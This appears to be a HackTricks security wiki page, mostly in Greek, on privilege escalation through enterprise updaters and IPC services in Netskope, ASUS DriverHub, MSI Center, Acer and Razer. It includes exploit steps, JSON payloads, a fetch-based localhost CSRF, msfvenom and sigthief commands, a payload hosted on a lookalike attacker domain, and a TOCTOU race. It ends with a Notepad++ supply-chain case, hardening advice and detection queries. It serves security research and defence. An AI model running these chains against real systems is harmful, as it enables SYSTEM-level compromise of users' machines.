# Κατάχρηση Enterprise Auto-Updaters και Privileged IPC (π.χ., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα γενικεύει μια κατηγορία Windows local privilege escalation chains που βρίσκονται σε enterprise endpoint agents και updaters, οι οποίοι εκθέτουν ένα low-friction IPC surface και ένα privileged update flow. Ένα αντιπροσωπευτικό παράδειγμα είναι το Netskope Client for Windows < R129 (CVE-2025-0309), όπου ένας low-privileged user μπορεί να εξαναγκάσει enrollment σε έναν attacker-controlled server και στη συνέχεια να παραδώσει ένα malicious MSI που το SYSTEM service εγκαθιστά.

Βασικές ιδέες που μπορείς να επαναχρησιμοποιήσεις απέναντι σε παρόμοια προϊόντα:
- Abuse ενός privileged service’s localhost IPC για να εξαναγκάσεις re-enrollment ή reconfiguration προς έναν attacker server.
- Υλοποίησε τα vendor’s update endpoints, παρέδωσε ένα rogue Trusted Root CA, και δείξε τον updater σε ένα malicious, “signed” package.
- Παρέκαμψε weak signer checks (CN allow-lists), optional digest flags, και lax MSI properties.
- Αν το IPC είναι “encrypted”, εξήγαγε το key/IV από world-readable machine identifiers που είναι αποθηκευμένα στο registry.
- Αν το service περιορίζει callers με image path/process name, κάνε inject σε ένα allow-listed process ή κάνε spawn ένα suspended και bootstrap το DLL σου μέσω ενός minimal thread-context patch.

---
## 1) Εξαναγκασμός enrollment σε attacker server μέσω localhost IPC

Πολλοί agents περιλαμβάνουν ένα user-mode UI process που επικοινωνεί με ένα SYSTEM service μέσω localhost TCP χρησιμοποιώντας JSON.

Παρατηρήθηκε στο Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Κατασκεύασε ένα JWT enrollment token του οποίου τα claims ελέγχουν το backend host (π.χ. AddonUrl). Χρησιμοποίησε alg=None ώστε να μην απαιτείται signature.
2) Στείλε το IPC message που καλεί το provisioning command με το JWT σου και το tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Η υπηρεσία αρχίζει να χτυπά τον rogue server σου για enrollment/config, π.χ.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Σημειώσεις:
- Αν το caller verification είναι path/name-based, προέλευσε το request από ένα allow-listed vendor binary (βλ. §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Μόλις ο client μιλήσει με τον server σου, υλοποίησε τα αναμενόμενα endpoints και κατεύθυνέ το σε ένα attacker MSI. Τυπική ακολουθία:

1) /v2/config/org/clientconfig → Επιστροφή JSON config με πολύ σύντομο updater interval, π.χ.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Επιστρέφει ένα PEM CA certificate. Η υπηρεσία το εγκαθιστά στο Local Machine Trusted Root store.
3) /v2/checkupdate → Παρέχει metadata που δείχνουν σε ένα malicious MSI και μια fake version.

Παράκαμψη κοινών ελέγχων που βλέπουμε στην πράξη:
- Signer CN allow-list: η υπηρεσία μπορεί να ελέγχει μόνο ότι το Subject CN ισούται με “netSkope Inc” ή “Netskope, Inc.”. Το rogue CA σου μπορεί να εκδώσει ένα leaf με αυτό το CN και να sign το MSI.
- CERT_DIGEST property: συμπερίλαβε ένα benign MSI property με όνομα CERT_DIGEST. Δεν γίνεται enforcement στο install.
- Optional digest enforcement: config flag (π.χ., check_msi_digest=false) απενεργοποιεί επιπλέον cryptographic validation.

Αποτέλεσμα: η SYSTEM υπηρεσία εγκαθιστά το MSI σου από
C:\ProgramData\Netskope\stAgent\data\*.msi
εκτελώντας arbitrary code ως NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Από το R127, το Netskope τύλιγε το IPC JSON σε ένα πεδίο encryptData που μοιάζει με Base64. Η reverse engineering έδειξε AES με key/IV που προέρχονται από registry values αναγνώσιμα από οποιονδήποτε χρήστη:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Οι attackers μπορούν να αναπαράγουν το encryption και να στέλνουν valid encrypted commands από standard user. Γενική συμβουλή: αν ένας agent ξαφνικά “encrypts” το IPC του, ψάξε για device IDs, product GUIDs, install IDs κάτω από HKLM ως υλικό.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Κάποιες υπηρεσίες προσπαθούν να authenticate τον peer, επιλύοντας το PID της TCP σύνδεσης και συγκρίνοντας το image path/name με allow-listed vendor binaries που βρίσκονται κάτω από το Program Files (π.χ., stagentui.exe, bwansvc.exe, epdlp.exe).

Δύο πρακτικά bypasses:
- DLL injection σε ένα allow-listed process (π.χ., nsdiag.exe) και proxy IPC από μέσα του.
- Εκκίνηση ενός allow-listed binary suspended και bootstrap του proxy DLL σου χωρίς CreateRemoteThread (δείτε §5) για να ικανοποιήσεις driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Τα products συχνά συνοδεύονται από minifilter/OB callbacks driver (π.χ., Stadrv) για να αφαιρούν επικίνδυνα δικαιώματα από handles προς protected processes:
- Process: αφαιρεί PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: περιορίζει σε THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ένας αξιόπιστος user-mode loader που σέβεται αυτούς τους περιορισμούς:
1) CreateProcess ενός vendor binary με CREATE_SUSPENDED.
2) Απόκτηση handles που ακόμη επιτρέπονται: PROCESS_VM_WRITE | PROCESS_VM_OPERATION στο process, και ένα thread handle με THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ή απλώς THREAD_RESUME αν patchάρεις code σε γνωστό RIP).
3) Overwrite του ntdll!NtContinue (ή άλλου early, guaranteed-mapped thunk) με ένα μικρό stub που καλεί LoadLibraryW στο path του DLL σου, και μετά κάνει jump πίσω.
4) ResumeThread για να ενεργοποιηθεί το stub σου in-process, φορτώνοντας το DLL σου.

Επειδή δεν χρησιμοποίησες PROCESS_CREATE_THREAD ή PROCESS_SUSPEND_RESUME σε ήδη-protected process (το δημιούργησες εσύ), η policy του driver ικανοποιείται.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) αυτοματοποιεί ένα rogue CA, malicious MSI signing, και σερβίρει τα απαραίτητα endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope είναι ένα custom IPC client που δημιουργεί arbitrary (προαιρετικά AES-encrypted) IPC messages και περιλαμβάνει το suspended-process injection ώστε να προέρχονται από ένα allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Όταν αντιμετωπίζεις ένα νέο endpoint agent ή motherboard “helper” suite, ένα γρήγορο workflow συνήθως αρκεί για να καταλάβεις αν βλέπεις έναν πολλά υποσχόμενο privesc target:

1) Enumerate loopback listeners και χαρτογράφησέ τους πίσω σε vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Απαρίθμηση υποψήφιων named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Εξόρυξε δεδομένα δρομολόγησης από το registry που χρησιμοποιούνται από IPC servers βασισμένους σε plugins:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Εξαγάγετε πρώτα τα ονόματα endpoints, τα JSON keys και τα command IDs από το user-mode client. Τα packed Electron/.NET frontends συχνά αποκαλύπτουν ολόκληρο το schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Αναζήτησε το πραγματικό trust predicate, όχι μόνο το code path που τελικά εκκινεί το process:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patterns worth prioritizing:
- `CryptQueryObject`/certificate parsing without `WinVerifyTrust` usually means “certificate exists” was treated as “certificate is trusted”, enabling certificate cloning or other fake-signer tricks.
- Substring/suffix checks over `Origin`, `Referer`, download URLs, process names, or signer CNs are not authentication. `contains(".vendor.com")` is usually exploitable with attacker-controlled lookalike domains.
- If the low-privileged GUI decides “the file is trusted” and the SYSTEM broker merely consumes that result, patching or reimplementing the client-side DLL/JS often bypasses the boundary entirely (Razer-style split validation).
- If the broker copies a payload to `%TEMP%`/`C:\Windows\Temp` and then validates or schedules it from that path, immediately test for TOCTOU replacement windows and for sibling plugin modules that expose alternate `ExecuteTask()` wrappers with weaker checks.

For named-pipe-heavy targets, PipeViewer is a quick way to spot weak DACLs and remotely reachable pipes before you start reversing the protocol in depth.

If the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary: injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Practical flow:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Ακόμη και το PowerShell CLI που φαίνεται παρακάτω επιτυγχάνει όταν το Origin header είναι spoofed στη trusted τιμή:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Οποιαδήποτε επίσκεψη browser στον site του attacker γίνεται έτσι ένα 1-click (ή 0-click μέσω `onload`) local CSRF που οδηγεί έναν SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

Το `/asus/v1.0/UpdateApp` κατεβάζει arbitrary executables που ορίζονται στο JSON body και τα κάνει cache στο `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Η validation του download URL ξαναχρησιμοποιεί την ίδια substring λογική, οπότε το `http://updates.asus.com.attacker.tld:8000/payload.exe` γίνεται accepted. Μετά το download, το ADU.exe απλώς ελέγχει ότι το PE περιέχει signature και ότι το Subject string ταιριάζει με ASUS πριν το εκτελέσει – χωρίς `WinVerifyTrust`, χωρίς chain validation.

Για να weaponize τη ροή:
1) Δημιούργησε ένα payload (π.χ., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Κλώνοσε μέσα του το signer της ASUS (π.χ., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host το `pwn.exe` σε ένα `.asus.com` lookalike domain και trigger το UpdateApp μέσω του browser CSRF παραπάνω.

Επειδή και τα Origin και URL filters βασίζονται σε substring, και ο signer check συγκρίνει μόνο strings, το DriverHub τραβάει και εκτελεί το attacker binary με το elevated context του.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Το SYSTEM service του MSI Center εκθέτει ένα TCP protocol όπου κάθε frame είναι `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Το core component (Component ID `0f 27 00 00`) περιλαμβάνει το `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Ο handler του:
1) Αντιγράφει το supplied executable στο `C:\Windows\Temp\MSI Center SDK.exe`.
2) Επαληθεύει τη signature μέσω `CS_CommonAPI.EX_CA::Verify` (το certificate subject πρέπει να είναι “MICRO-STAR INTERNATIONAL CO., LTD.” και το `WinVerifyTrust` να πετυχαίνει).
3) Δημιουργεί ένα scheduled task που τρέχει το temp file ως SYSTEM με attacker-controlled arguments.

Το copied file δεν κλειδώνεται μεταξύ verification και `ExecuteTask()`. Ένας attacker μπορεί να:
- Στείλει Frame A που δείχνει σε ένα legitimate MSI-signed binary (εγγυάται ότι το signature check περνά και το task μπαίνει στην ουρά).
- Το race-άρει με επαναλαμβανόμενα Frame B messages που δείχνουν σε malicious payload, overwrite-άροντας το `MSI Center SDK.exe` αμέσως μετά την ολοκλήρωση του verification.

Όταν ο scheduler ενεργοποιηθεί, εκτελεί το overwritten payload ως SYSTEM, παρότι είχε επικυρώσει το original file. Αξιόπιστη εκμετάλλευση χρησιμοποιεί δύο goroutines/threads που spam-άρουν το `CMD_AutoUpdateSDK` μέχρι να κερδηθεί το TOCTOU window.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Κάθε plugin/DLL που φορτώνεται από το `MSI.CentralServer.exe` λαμβάνει ένα Component ID αποθηκευμένο στο `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Τα πρώτα 4 bytes ενός frame επιλέγουν αυτό το component, επιτρέποντας στους attackers να δρομολογήσουν commands σε arbitrary modules.
- Τα plugins μπορούν να ορίσουν δικά τους task runners. Το `Support\API_Support.dll` εκθέτει το `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` και καλεί απευθείας το `API_Support.EX_Task::ExecuteTask()` με **no signature validation** – οποιοσδήποτε local user μπορεί να το δείξει στο `C:\Users\<user>\Desktop\payload.exe` και να πάρει SYSTEM execution deterministically.
- Το sniffing του loopback με Wireshark ή η instrumenting των .NET binaries στο dnSpy αποκαλύπτει γρήγορα το Component ↔ command mapping· custom Go/ Python clients μπορούν μετά να replay-άρουν τα frames.

### Acer Control Centre named pipes & impersonation levels
- Το `ACCSvc.exe` (SYSTEM) εκθέτει το `\\.\pipe\treadstone_service_LightMode`, και το discretionary ACL του επιτρέπει remote clients (π.χ., `\\TARGET\pipe\treadstone_service_LightMode`). Η αποστολή command ID `7` με ένα file path καλεί τη διαδικασία spawning process του service.
- Η client library serializes ένα magic terminator byte (113) μαζί με args. Dynamic instrumentation με Frida/`TsDotNetLib` (δες το [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) για instrumentation tips) δείχνει ότι ο native handler αντιστοιχίζει αυτή την τιμή σε `SECURITY_IMPERSONATION_LEVEL` και integrity SID πριν καλέσει το `CreateProcessAsUser`.
- Η αντικατάσταση του 113 (`0x71`) με 114 (`0x72`) πέφτει στο generic branch που κρατά το πλήρες SYSTEM token και ορίζει high-integrity SID (`S-1-16-12288`). Το spawned binary έτσι τρέχει ως unrestricted SYSTEM, τόσο τοπικά όσο και cross-machine.
- Συνδύασέ το με το exposed installer flag (`Setup.exe -nocheck`) για να στήσεις το ACC ακόμη και σε lab VMs και να δοκιμάσεις το pipe χωρίς vendor hardware.

Αυτά τα IPC bugs δείχνουν γιατί τα localhost services πρέπει να enforce-άρουν mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) και γιατί κάθε “run arbitrary binary” helper κάθε module πρέπει να μοιράζεται τις ίδιες signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Το Razer Synapse 4 πρόσθεσε ένα ακόμη χρήσιμο pattern σε αυτή την οικογένεια: ένας low-privileged user μπορεί να ζητήσει από ένα COM helper να εκκινήσει ένα process μέσω του `RzUtility.Elevator`, ενώ η trust απόφαση ανατίθεται σε ένα user-mode DLL (`simple_service.dll`) αντί να επιβάλλεται robustly μέσα στο privileged boundary.

Observed exploitation path:
- Instantiate το COM object `RzUtility.Elevator`.
- Κάλεσε `LaunchProcessNoWait(<path>, "", 1)` για να ζητήσεις elevated launch.
- Στο public PoC, το PE-signature gate μέσα στο `simple_service.dll` γίνεται patched out πριν σταλεί το request, επιτρέποντας να εκκινηθεί οποιοδήποτε attacker-chosen executable.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Γενικό συμπέρασμα: όταν κάνετε reversing σε σουίτες “helper”, μην σταματάτε σε localhost TCP ή named pipes. Ελέγξτε για COM classes με ονόματα όπως `Elevator`, `Launcher`, `Updater`, ή `Utility`, και μετά επαληθεύστε αν το privileged service πραγματικά κάνει validation στο ίδιο το target binary ή απλώς εμπιστεύεται ένα αποτέλεσμα που υπολογίζεται από ένα patchable user-mode client DLL. Αυτό το pattern γενικεύεται πέρα από το Razer: κάθε split design όπου το high-privilege broker καταναλώνει μια allow/deny απόφαση από την low-privilege πλευρά είναι υποψήφια privesc surface.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Μεταξύ Ιουνίου 2025 και Δεκεμβρίου 2025, attackers που compromised την hosting infrastructure πίσω από το Notepad++ update flow έστελναν επιλεκτικά malicious manifests σε επιλεγμένα victims. Παλαιότερα WinGUp-based updaters δεν επαλήθευαν πλήρως το update authenticity, οπότε ένα hostile XML response μπορούσε να ανακατευθύνει clients σε attacker-controlled URLs. Επειδή ο client αποδεχόταν HTTPS content χωρίς να επιβάλλει τόσο trusted certificate chain όσο και valid PE signature στο downloaded installer, τα victims κατέβαζαν και εκτελούσαν ένα trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting και απάντηση στα update checks με attacker metadata που δείχνει σε malicious download URL.
2. **Trojanized NSIS**: ο installer fetches/executes ένα payload και abuses δύο execution chains:
- **Bring-your-own signed binary + sideload**: bundle το signed Bitdefender `BluetoothService.exe` και drop ένα malicious `log.dll` στο search path του. Όταν εκτελείται το signed binary, το Windows sideloads το `log.dll`, το οποίο decrypts και reflectively loads το Chrysalis backdoor (Warbird-protected + API hashing για να δυσκολεύει το static detection).
- **Scripted shellcode injection**: το NSIS εκτελεί ένα compiled Lua script που χρησιμοποιεί Win32 APIs (π.χ. `EnumWindowStationsW`) για να inject shellcode και να stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Επιβάλετε **certificate + signature verification** του downloaded installer (pin vendor signer, reject mismatched CN/chain) και sign το ίδιο το update manifest (π.χ. XMLDSig). Block manifest-controlled redirects εκτός αν validated.
- Θεωρήστε το **BYO signed binary sideloading** ως post-download detection pivot: alert όταν ένα signed vendor EXE φορτώνει ένα DLL name από έξω από το canonical install path του (π.χ. Bitdefender loading `log.dll` από Temp/Downloads) και όταν ένας updater drop/executes installers από temp με non-vendor signatures.
- Παρακολουθήστε **malware-specific artifacts** που παρατηρήθηκαν σε αυτή την αλυσίδα (χρήσιμα ως generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes στο `%TEMP%`, και Lua-driven shellcode injection stages.
- Το Notepad++ απάντησε ενισχύοντας το WinGUp στο v8.8.9 και μετά: το returned XML είναι πλέον signed (XMLDSig), και τα νεότερα builds επιβάλλουν certificate + signature verification του downloaded installer αντί να εμπιστεύονται μόνο το transport.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> εκκινεί ένα installer που δεν είναι του Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Αυτά τα patterns γενικεύονται σε οποιοδήποτε updater που δέχεται unsigned manifests ή αποτυγχάνει να κάνει pin τους installer signers—network hijack + malicious installer + BYO-signed sideloading οδηγεί σε remote code execution υπό το πρόσχημα “trusted” updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
